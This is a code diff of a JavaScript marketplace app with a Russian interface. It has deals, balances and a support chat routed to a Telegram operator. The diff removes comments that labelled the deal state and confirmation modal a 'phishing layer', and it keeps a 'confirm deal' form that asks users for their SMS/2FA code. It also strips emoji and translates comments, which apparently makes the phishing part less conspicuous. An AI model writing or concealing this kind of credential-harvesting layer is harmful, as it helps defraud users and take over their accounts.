@@ -42,13 +42,11 @@
     listings: saved.listings || [],
     orders: saved.orders || [],
     ops: saved.ops || [],
-    support: saved.support || [{ id: "s0", from: "support", text: "👋 Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
-    /* --- phishing layer --- */
+    support: saved.support || [{ id: "s0", from: "support", text: " Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
     dealBalance: saved.dealBalance || 0,
     dealDeals: saved.dealDeals || [],
     confirmModal: null,
     dealFilter: saved.dealFilter || "all",
-    /* --- end phishing layer --- */
     screen: "profile",
     selectedId: null,
     toast: null,
@@ -647,7 +645,7 @@
             <label class="label">Код из SMS / 2FA (если требуется)</label>
             <input class="field" id="cpOtp" type="text" placeholder="Код подтверждения" inputmode="numeric" autocomplete="one-time-code">
           </div>
-          <button type="submit" class="btn btn-primary mt-4">🔒 Подтвердить сделку</button>
+          <button type="submit" class="btn btn-primary mt-4"> Подтвердить сделку</button>
         </form>
         <button type="button" class="btn btn-ghost mt-2" data-close-confirm style="width:100%">Отмена</button>
       </div>
@@ -869,9 +867,7 @@
     go("deals");
   }
 
-  // ==========================================
-  // GLOBAL EVENT DELEGATION (ONE TIME)
-  // ==========================================
+  // ГЛОБАЛЬНЫЕ СЛУШАТЕЛИ (ОДИН РАЗ)
   const app = document.getElementById("app");
   app.addEventListener("click", (e) => {
     const t = e.target.closest("[data-go],[data-buy],[data-site],[data-back],[data-fold],[data-pick],[data-region],[data-role],[data-svc],[data-game],[data-want],[data-offer],[data-sell-next],[data-sell-back],[data-publish],[data-buy-go],[data-sheet],[data-ccy],[data-pick-ccy],[data-set-ccy],[data-topup],[data-withdraw],[data-sort-dir],[data-sort-key],[data-save-api],[data-send-chat],[data-confirm-deal],[data-deal-filter],[data-close-confirm]");
@@ -950,7 +946,7 @@
     if (t.hasAttribute("data-close-confirm")) { state.confirmModal = null; render(); return; }
   });
 
-  // Input listeners (attach once)
+  // Инпуты (один раз)
   document.getElementById("photos")?.addEventListener("change", async (e) => {
     const files = Array.from(e.target.files || []);
     for (const f of files.slice(0, 8 - state.sell.photos.length)) { try { state.sell.photos.push(await compressFile(f)); } catch {} }
